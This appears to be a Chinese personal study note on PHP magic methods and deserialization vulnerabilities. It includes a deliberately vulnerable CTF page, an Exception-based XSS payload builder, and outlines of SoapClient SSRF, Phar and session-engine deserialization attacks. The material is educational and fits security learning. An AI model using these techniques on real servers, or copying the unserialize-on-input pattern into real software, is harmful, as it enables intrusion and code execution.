-注：测试 PHP，为直观显示输出结果，我将”\n”纯文本换行符换成了 ““ HTML换行标签，方便直观分行。但部署到 Apache、Nginx 等 Web 服务器、浏览器访问时需改用&lt;br&gt;，因为浏览器会把 PHP 输出内容当作 HTML 解析，文本换行\n只会显示成空格，只有&lt;br&gt;才能实现页面换行效果。
-
-1. __construct 与 __destruct
-__construct()：构造方法，对象创建时自动调用。
-__destruct()：析构方法，对象销毁时自动调用。
-
-示例：
-&lt;?phpheader(&quot;Content-type: text/html; charset=utf-8&quot;);highlight_file(__FILE__);class Person&#123;public $name=&#x27;Jack&#x27;;function __construct()&#123;echo &quot;&lt;br&gt;调用&quot;.&quot;__construct&quot;;echo &quot;&lt;br&gt;&quot;;&#125;function __destruct()&#123;echo &quot;调用&quot;.&quot;__destruct&quot;;echo &quot;&lt;br&gt;&quot;;&#125;&#125;$a= new Person();echo serialize($a);echo &quot;&lt;br&gt;&quot;;?&gt;
-
-流程推演：
-
-new 一个对象会触发 __construct 并 echo ‘调用 construct’
-执行序列化任务
-整个 PHP 脚本运行结束（或变量被手动 unset）时，系统开始清理内存并销毁对象，此时会触发 __destruct，并 echo ‘调用 destruct’。
-
-2. __sleep 与 __wakeup
-__sleep()：对象序列化时自动调用。
-__wakeup()：对象反序列化时自动调用。
-
-示例：
-&lt;?phpheader(&quot;Content-type: text/html; charset=utf-8&quot;);highlight_file(__FILE__);class Person&#123;public $name=&#x27;Jack&#x27;;function __construct()&#123;echo &quot;调用&quot;.&quot;__construct&quot;;echo &quot;&lt;br&gt;&quot;;&#125;function __destruct()&#123;echo &quot;调用&quot;.&quot;__destruct&quot;;echo &quot;&lt;br&gt;&quot;;&#125;function __sleep()&#123;echo &quot;调用&quot;.&quot;__sleep&quot;;echo &quot;&lt;br&gt;&quot;;return array(&quot;name&quot;);&#125;function __wakeup()&#123;echo &quot;调用&quot;.&quot;__wakeup&quot;;echo &quot;&lt;br&gt;&quot;;&#125;&#125;$a= new Person();echo serialize($a);$b=&#x27;O:6:&quot;Person&quot;:1:&#123;s:4:&quot;name&quot;;s:4:&quot;Jack&quot;;&#125;&#x27;;echo &quot;&lt;br&gt;&quot;;$c=unserialize($b);var_dump($c);?&gt;
-
-流程推演：
-
-new 一个对象 $a，触发 __construct。
-调用 serialize($a)，在转换为字符串之前，触发 __sleep。
-echo 打印序列化结果。
-调用 unserialize()，系统根据字符串在内存中生成了一个全新的对象，并触发 __wakeup。
-var_dump 打印反序列化结果。
-当程序彻底结束运行时，系统开始清空内存。因为此时内存中同时存活住了两个对象（一开始 new 出来的 $a，和后来 unserialize 捏造出来的新对象），连续触发了两次 __destruct。
-
-注意：
-反序列化的入口必须是字符串，绝对不能是对象本身。unserialize()这个函数的功能是”把字符串变回对象”。因此，它只能接收字符串作为参数。也不可以直接用 echo 打印对象。
-因此代码不可以写成：
-$a= new Person();echo serialize($a);$b = $a; 			//给 $b 赋值一串字符串：$b=&#x27;O:6:&quot;Person&quot;:1:&#123;s:4:&quot;name&quot;;s:4:&quot;Jack&quot;;&#125;&#x27;;$c = unserialize($b);echo &quot;$c&quot;;		//var_dump($c); 或者用 print_r($c);
-
-3. __get 与 __set
-__get()：访问不存在&#x2F;私有属性时自动调用。
-__set()：赋值给不存在&#x2F;私有属性时自动调用。
-
-示例：
-&lt;?phpheader(&quot;Content-type: text/html; charset=utf-8&quot;);highlight_file(__FILE__);class Person &#123;public $name = &#x27;Jack&#x27;;private $str = &#x27;hello&#x27;;function __construct() &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; .&quot; __construct()&quot;;&#125;function __destruct() &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; . &quot;__destruct()&quot;;echo &quot;&lt;br&gt;&quot;;&#125;function __get($b) &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; . &quot;__get&quot;;echo &quot;&lt;br&gt;&quot;;return $this-&gt;str;&#125;function __set($name,$value) &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; . &quot;__set&quot;;echo &quot;&lt;br&gt;&quot;;$this-&gt;str = $value;&#125;&#125;$a= new Person();echo $a-&gt;age;$a-&gt;age=13;echo $a-&gt;str;?&gt;
-
-流程推演：
-
-new 一个对象 $a，触发 __construct 执行。输出 调用 __construct()。
-读拦截 (__get)：执行 echo $a-&gt;age;。因为 age 这个属性在类里不可访问，系统立刻拦截，触发了 __get 方法。
-__get 内部先输出了 调用 __get。
-然后它执行了 return $this-&gt;str;初始值应该是 &#39;hello&#39;。
-
-
-echo 拿到返回值，打印出了 hello。
-写拦截 (__set)： 执行 $a-&gt;age = 13;给一个不存在的属性 age 强行赋值。系统再次拦截，触发了 __set 方法。
-__set 内部先输出了 调用 __set。
-接着执行 $this-&gt;str = $value;传进来的 13赋值给了内部的 $str 属性。
-
-
-再次读拦截： 执行 echo $a-&gt;str;
-系统再次触发 __get，输出 调用 __get。
-此时返回 $this-&gt;str，因为上一步它已经被改成了 13，所以外部的 echo 最终打印出了 13。
-
-
-脚本执行结束，内存清空销毁对象，自动触发 __destruct，输出 调用 __destruct()。
-
-4. __call 与 __callStatic
-__call()：调用对象中不存在的实例方法时自动调用。
-__callStatic()：调用类中不存在的静态方法时自动调用。
-
-示例：
-&lt;?phpheader(&quot;Content-type: text/html; charset=utf-8&quot;);highlight_file(__FILE__);class Person &#123;public $name = &#x27;Jack&#x27;;public $str = &#x27;hello&#x27;;public static function myStaticMethod() &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; . &quot;myStaticMethod&quot;;echo &quot;&lt;br&gt;&quot;;&#125;function __construct() &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; .&quot; __construct()&quot;;echo &quot;&lt;br&gt;&quot;;&#125;function __destruct() &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; . &quot;__destruct()&quot;;echo &quot;&lt;br&gt;&quot;;&#125;function __call($b,$q) &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; . &quot;__call&quot;;echo &quot;&lt;br&gt;&quot;;return $this-&gt;str;&#125;public static function __callStatic($func, $arguments)&#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; . &quot;__callStatic&quot;;echo &quot;&lt;br&gt;&quot;;&#125;&#125;$a= new Person();echo $a-&gt;method();Person::myStaticMethod();Person::method2();?&gt;
-
-流程推演：
-
-创建对象 $a。自动触发 __construct()。输出调用 __construct()
-echo $a-&gt;method();PHP 引擎试图在 $a 这个对象里寻找一个叫 method() 的普通方法。但是并不存在。触发 __call($b, $q)，先输出 调用 __call。接着代码里写了 return $this-&gt;str;，于是把内部属性 &#39;hello&#39; 返回给了外面的 echo，最终在屏幕上打印出了 hello。
-Person::myStaticMethod();，:: 是静态调用的符号。PHP 引擎去 Person 类里找 myStaticMethod()。发现这个静态方法真实存在，且权限是 public。直接执行该方法，输出 调用 myStaticMethod。
-Person::method2();PHP 引擎试图静态调用一个叫 method2() 的方法。发现并不存在。触发__callStatic($func, $arguments)，输出 调用 __callStatic。
-脚本运行结束，内存开始清空自动触发 __destruct()。输出调用 __destruct()。
-
-5. __toString 与 __clone
-__toString()：对象被当作字符串使用&#x2F;输出时自动调用。
-__clone()：使用clone关键字克隆对象时自动调用。
-
-示例：
-&lt;?phpheader(&quot;Content-type: text/html; charset=utf-8&quot;);highlight_file(__FILE__);class Person &#123;public $name = &#x27;Jack&#x27;;function __construct() &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; .&quot; __construct()&quot;;echo &quot;&lt;br&gt;&quot;;&#125;function __destruct() &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; . &quot;__destruct()&quot;;echo &quot;&lt;br&gt;&quot;;&#125;function __toString() &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; . &quot;__toString&quot;;echo &quot;&lt;br&gt;&quot;;return $this-&gt;name;&#125;function __clone() &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; . &quot;__clone&quot;;echo &quot;&lt;br&gt;&quot;;&#125;&#125;$a= new Person();echo $a . &#x27;&lt;br&gt;&#x27;;$b = $a;echo $a === $b;$c = clone $a;echo $a === $c;?&gt;
-
-流程推演：
-
-new 一个对象$a，输出调用 __construct()
-echo $a . &#39;&lt;br&gt;&#39;;对象 $a 和一个字符串 &#39;&lt;br&gt;&#39; 拼接在一起打印。为了防止报错，系统强行触发了对象的 __toString() 方法。输出调用 __toString，然后把返回的 $this-&gt;name（也就是 &#39;Jack&#39;）拼接到 &lt;br&gt; 前面输出。
-引用赋值$b = $a;
-echo $a === $b;结果为 true。经过 echo 的强制类型转换。打印出数字 1。
-$c = clone $a;创造了一个新对象 $c，它的属性和 $a 一模一样，但它们在内存中是独立的两个实体。新对象诞生时自动触发 __clone()。输出调用 __clone。
-echo $a === $c;再次比较，虽然长得一样，但已经是两个不同的实体了，所以结果为 false。echo false 在 PHP 中输出空字符串。
-代码执行结束，内存开始清空。两个对象被销毁，连续打印两次 调用 __destruct()。
-
-6. __invoke将对象当作函数直接调用时自动触发。示例：
-&lt;?phpheader(&quot;Content-type: text/html; charset=utf-8&quot;);highlight_file(__FILE__);class Person &#123;public $name = &#x27;Jack&#x27;;function __construct() &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; .&quot; __construct()&quot;;echo &quot;&lt;br&gt;&quot;;&#125;function __destruct() &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; . &quot;__destruct()&quot;;echo &quot;&lt;br&gt;&quot;;&#125;function __invoke($p1,$p2) &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; . &quot;__invoke&quot;;echo &quot;&lt;br&gt;&quot;;return $p1 . &quot;---&quot; . $p2;&#125;&#125;$a= new Person();echo $a(&quot;Jack&quot;,&quot;is a hacker&quot;);?&gt;
-
-流程推演：
-
-创建对象 $a，触发 __construct()。调用 __construct()。
-echo $a(&quot;Jack&quot;,&quot;is a hacker&quot;);把一个对象（$a）当成了函数来加括号调用。括号里传的两个字符串 &quot;Jack&quot; 和 &quot;is a hacker&quot;传给了 __invoke($p1, $p2)。
-先触发内部的 echo 输出 调用 __invoke。接着执行 return 语句将两个参数拼接。输出Jack---is a hacker。
-程序结束，内存清空，对象销毁，触发 __destruct()。输出调用 __destruct()。
-
-7. __isset 与 __unset
-__isset()：对不可访问属性执行isset()/empty()时自动调用。
-__unset()：对不可访问属性执行unset()销毁时自动调用。
-
-示例：
-&lt;?phpheader(&quot;Content-type: text/html; charset=utf-8&quot;);highlight_file(__FILE__);class Person&#123;public $sex;private $name;private $age;public function __construct($name = &#x27;&#x27;, $age = 25, $sex = &#x27;男&#x27;)&#123;$this-&gt;name = $name;$this-&gt;age = $age;$this-&gt;sex = $sex;&#125;public function __isset($name)&#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; .&quot; __isset()&quot;;echo &quot;&lt;br&gt;&quot;;&#125;public function __unset($name)&#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; .&quot; __unset()&quot;;echo &quot;&lt;br&gt;&quot;;&#125;&#125;$person = new Person(&#x27;Jack&#x27;, 18, &#x27;male&#x27;);// __isset()echo isset($person-&gt;sex);echo isset($person-&gt;name);echo isset($person-&gt;age);// __unset()echo &quot;\n&quot;;unset($person-&gt;name);unset($person-&gt;sex);echo isset($person-&gt;sex) ? &#x27;has&#x27; : &#x27;not_has&#x27;, &quot;\n&quot;;?&gt;
-
-流程推演：
-
-new 一个对象，包含公开属性 sex，私有属性 name 和 age。
-echo isset($person-&gt;sex);代码可以直接拿到公开的数据 sex（不触发魔术方法）；但是对于私有数据无法直接接触。因为 sex 是 public，系统直接放行，结果为 true。经过 echo 的强制类型转换，屏幕上打出了数字 1。
-echo isset($person-&gt;name); echo isset($person-&gt;age);当执行 isset 探测 name和age 时，因为权限不够，连续两次被拦截并触发了 __isset 方法，输出了两次提示。
-代码试图用 unset 销毁私有的 name，再次被拦截，触发了 __unset 方法并输出提示。
-当试图销毁公开的 sex 时，因为权限足够，系统没有拦截，而是直接在内存里把它真实删除了。
-最后用三目运算符再次探测 sex 时，发现它已经被删没了，所以输出了 not_has。
-
-
-三、CTF 序列化实战题目示例：CTF-XSS 结合反序列化页面代码 ctf_xss.php
-&lt;?phphighlight_file(__file__);$a = unserialize($_GET[&#x27;k&#x27;]);echo $a;?&gt;
-
-解题思路
-代码调用unserialize反序列化，且直接echo输出对象，触发__toString魔术方法。
-利用PHP原生类（无需自定义）Exception，该类存在__toString方法。
-构造包含XSS语句的Exception对象，序列化后传入参数。
-
-构造代码&lt;?php$e = new Exception(&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;);echo urlencode(serialize($e));?&gt;
-
-将输出字符串作为k参数传入，触发XSS弹窗。
-流程推演：
-
-当服务器执行到 echo $a; 时，强行触发了 Exception 对象的 __toString。
-__toString 强制输出了报错信息，导致原本在 PHP 后端内存对象里的恶意 JS 代码&lt;script&gt;alert(1)&lt;/script&gt;被提取出来，当作一串普通的字符串，拼接到了最终要发送的 HTML 网页源码里。
-服务器把拼凑好的 HTML 源码通过网络发送给了普通用户的浏览器。前端开始逐行解析网页准备渲染画面。当浏览器解析到 &lt;script&gt; 这个标签时，它的 JS 引擎被瞬间激活执行了这句 JavaScript 语句，成功弹出了框框。
-
-补充：查看PHP所有原生魔术方法类&lt;?php$classes = get_declared_classes();foreach ($classes as $class) &#123;$methods = get_class_methods($class);foreach ($methods as $method) &#123;if (in_array($method, array(&#x27;__destruct&#x27;,&#x27;__toString&#x27;,&#x27;__wakeup&#x27;,&#x27;__call&#x27;,&#x27;__callStatic&#x27;,&#x27;__get&#x27;,&#x27;__set&#x27;,&#x27;__isset&#x27;,&#x27;__unset&#x27;,&#x27;__invoke&#x27;,&#x27;__set_state&#x27;))) &#123;print $class . &#x27;::&#x27; . $method . &quot;\n&quot;;&#125;&#125;&#125;?&gt;
-
-Exception::__wakeupException::__toStringErrorException::__wakeupErrorException::__toStringError::__wakeupError::__toStringCompileError::__wakeupCompileError::__toStringParseError::__wakeupParseError::__toStringTypeError::__wakeupTypeError::__toStringArgumentCountError::__wakeupArgumentCountError::__toStringArithmeticError::__wakeupArithmeticError::__toStringDivisionByZeroError::__wakeupDivisionByZeroError::__toStringClosedGeneratorException::__wakeupClosedGeneratorException::__toStringDateTime::__wakeupDateTime::__set_stateDateTimeImmutable::__wakeupDateTimeImmutable::__set_stateDateTimeZone::__wakeupDateTimeZone::__set_stateDateInterval::__wakeupDateInterval::__set_stateDatePeriod::__wakeupDatePeriod::__set_stateDOMException::__wakeupDOMException::__toStringJsonException::__wakeupJsonException::__toStringLogicException::__wakeupLogicException::__toStringBadFunctionCallException::__wakeupBadFunctionCallException::__toStringBadMethodCallException::__wakeupBadMethodCallException::__toStringDomainException::__wakeupDomainException::__toStringInvalidArgumentException::__wakeupInvalidArgumentException::__toStringLengthException::__wakeupLengthException::__toStringOutOfRangeException::__wakeupOutOfRangeException::__toStringRuntimeException::__wakeupRuntimeException::__toStringOutOfBoundsException::__wakeupOutOfBoundsException::__toStringOverflowException::__wakeupOverflowException::__toStringRangeException::__wakeupRangeException::__toStringUnderflowException::__wakeupUnderflowException::__toStringUnexpectedValueException::__wakeupUnexpectedValueException::__toStringCachingIterator::__toStringRecursiveCachingIterator::__toStringSplFileInfo::__toStringDirectoryIterator::__toStringFilesystemIterator::__toStringRecursiveDirectoryIterator::__toStringGlobIterator::__toStringSplFileObject::__toStringSplTempFileObject::__toStringSplFixedArray::__wakeupPDOException::__wakeupPDOException::__toStringReflectionException::__wakeupReflectionException::__toStringReflectionFunctionAbstract::__toStringReflectionFunction::__toStringReflectionParameter::__toStringReflectionType::__toStringReflectionNamedType::__toStringReflectionMethod::__toStringReflectionClass::__toStringReflectionObject::__toStringReflectionProperty::__toStringReflectionClassConstant::__toStringReflectionExtension::__toStringReflectionZendExtension::__toStringAssertionError::__wakeupAssertionError::__toStringSimpleXMLElement::__toStringSimpleXMLIterator::__toStringPharException::__wakeupPharException::__toStringPhar::__destructPhar::__toStringPharData::__destructPharData::__toStringPharFileInfo::__destructPharFileInfo::__toString
-
-利用：
-XSS &#x2F; 信息泄露： 利用 Exception 或 Error。遇到 echo 时，其 __toString 会将肚子里的报错信息（恶意代码）吐到前端。
-SSRF (内网探针) ： 利用 SoapClient。触发其 __call 方法可强行向内网发送 HTTP 请求。
-文件&#x2F;目录遍历： 利用 DirectoryIterator 或 FilesystemIterator 配合 __toString 读取敏感目录。
-Phar 反序列化： 利用 Phar。无需 unserialize，只需普通文件读取操作（如 file_exists, filesize, file_get_contents, md5_file 等）即可引爆反序列化。
-
-
-四、PHP 反序列化攻击
-核心： 寻找从入口unserialize()到危险函数的”多米诺骨牌”（POP 链）。
-显式入口 (函数类)： 代码直接调用 unserialize()。
-隐式入口 (协议&#x2F;机制类)：
-Phar 协议： 利用 phar:// 伪协议，通过文件操作触发。
-Session 机制： 利用 session.serialize_handler 引擎不一致触发。
-
-
-
-Exception XSS
-触发条件： 存在 unserialize() 入口 &amp;&amp; echo&#x2F;print 输出点。
-动作： 构造 new Exception(&quot;&lt;script&gt;...&quot;)。
-关键点： 触发 Exception::__toString。
-
-Session 反序列化
-触发条件： 存在”存取引擎不一致” (php vs php_serialize)。
-动作：
-寻找写入 Session 的接口，投毒 Payload：| + 序列化字符串。
-触发读取 Session 的页面，触发引擎自动反序列化。
-
-
-关键点： session.auto_start=1 导致的顺序冲突。
-注：若条件竞争不成功，增加上传文件大小（上传超大文件）以延长 Session 文件存活时间，扩大 0.01 秒的窗口期。 增加文件大小 &#x3D; “让子弹多飞一会儿”，增加命中概率。
-
-Phar 反序列化
-触发条件： 代码存在任意文件操作函数 (file_exists, md5_file 等)。
-动作： phar:// + 伪装后缀 (.jpg)。
-关键点： 利用 PHP 底层 phar:// 协议强制反序列化。
-注：Phar 文件必须包含合法签名（如 \x00\x00\xfe\x01）。若手动修改或生成时破坏了签名，PHP 将拒绝识别文件，导致漏洞无法触发。
-
-
-五、总结Q1: PHP 序列化漏洞中，有哪些魔术方法？
-__construct ⭐️构造方法，仅new创建对象时自动触发，反序列化不会执行。
-__destruct ⭐️析构方法，对象销毁、脚本运行结束、反序列化完成后自动触发。
-__toString将对象当作字符串输出、拼接时自动触发。
-__wakeup ⭐️执行反序列化unserialize()时最先触发，存在经典属性数量绕过漏洞。
-__sleep执行序列化serialize()对象前自动触发。
-__call调用不存在或无访问权限的方法时自动触发。
-__get读取不存在、私有&#x2F;受保护不可访问的属性时自动触发。
-__set修改不存在、私有&#x2F;受保护不可访问的属性时自动触发。
-__invoke把对象当作函数（$obj()）调用时自动触发。
-
-Q2: 序列化和反序列化的过程是什么？序列化：把内存中的对象，转换成字符串或字节码，便于存储和网络传输
-反序列化：把字符串或字节码还原为内存中的对象
-Q3: 序列化漏洞的产生原因是什么？用户可以通过 HTTP、或其他网络协议向服务器发送任意的序列化字符串或字节码，服务器未经严格验证就进行了反序列化。
-Q4: 反序列化漏洞的危害有哪些？RCE（远程代码执行），权限提升，敏感信息泄露，DDOS攻击，内网渗透（以该服务器为跳板，攻击公司内网中的其他设备）
-Q5: POP链是什么？攻击者通过控制对象的属性，将程序中现有的多个代码片段（Gadgets）像接龙一样串联起来，最终形成的一条攻击路径。
-Q6: session 反序列化是什么？session 反序列化漏洞是指攻击者通过篡改储存在 session 中的序列化数据，利用服务器解析（还原）这些数据时的逻辑缺陷，从而实现越权访问或远程执行恶意代码的安全漏洞。
-Q7: session 反序列化的形成原因是什么？
-php 使用了不同的 session 序列化引擎处理 session（存入 Session 时使用新引擎 php_serialize（无竖线），读取时使用旧引擎 php（以竖线 | 分割键值）。核心在于读取时，PHP 引擎会对 Session 中的竖线 | 进行切分，并将右侧数据强制反序列化。）
-php 保存 session 的过程是序列化，php 读取 session 的过程是反序列化。
-
-Q8: session 反序列化的危害是什么？RCE（远程代码执行）
-Q9: session 序列化引擎有哪些？PHP、PHP_serialize、PHP_binary
-username=zhangsan的结果是PHP引擎：username | s:8:&quot;zhangsan&quot;;PHP_serialize引擎:a:1:&#123;s:8:&quot;username&quot;;s:8:&quot;zhangsan&quot;;&#125;php_binary引擎:[BS]�usernames:8:&quot;zhangsan&quot;;
-
-Q10: 文件上传进度反序列化是什么？文件上传进度反序列化是指攻击者通过在上传表单中构造恶意的进度标识符，利用 PHP 自动将上传信息存入 session 的机制，结合 session 引擎解析差异，强制服务器在后台还原恶意对象从而触发代码执行。
-Q11: 文件上传进度反序列化的作用是什么？php会话上传进度，phpinfo信息泄露可以看到对应的信息
-
-session.upload_progress.enabled 会话上传进度是否开启
-session.upload_progress.name 会话上传进度名
-session.upload_progress.cleanup 会话上传进度是否会自动清理
-
-当一个文件上传时，PHP 会检查 HTTP 请求。如果发现请求中包含一个特定的变量（默认名称为PHP_SESSION_UPLOAD_PROGRESS），它就会在 $_SESSION 数组中创建一个特殊的键。可用于Session序列化漏洞
-这个键里包含了文件的总大小、当前已上传的大小、预计剩余时间等实时数据。前端可以通过另一个异步请求（AJAX）读取这些 Session 数据，从而绘制出进度条。
-
-本文为个人学习笔记，如有错误或疏漏，欢迎批评指正。
-
-]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>PHP</category>
-      </categories>
-      <tags>
-        <tag>PHP</tag>
       </tags>
   </entry>
 </search>
